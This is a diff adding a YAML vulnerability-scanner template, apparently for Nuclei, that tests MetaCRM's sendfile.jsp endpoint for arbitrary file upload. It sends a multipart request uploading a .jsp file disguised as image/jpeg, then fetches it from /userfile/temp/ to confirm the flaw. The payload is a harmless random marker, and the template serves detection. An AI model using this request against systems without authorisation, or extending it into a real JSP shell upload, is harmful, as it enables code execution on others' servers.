@@ -1,0 +1,61 @@
+id: metacrm-sendfile-jsp-anyfile-upload
+
+info:
+  name: MetaCRM Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    MetaCRM sendfile.jsp endpoint is vulnerable to arbitrary file upload, allowing attackers to upload and execute JSP files.
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "/business/common/importdata/sendfile.jsp"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: image/jpeg
+
+      {{t2}}
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "userfile"
+          - ".jsp"
+    extractors:
+      - type: regex
+        name: file
+        group: 0
+        regex:
+          - "([0-9a-z]{32}).jsp"
+        internal: true
+
+  - id: file-access
+    method: GET
+    path:
+      - "/userfile/temp/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
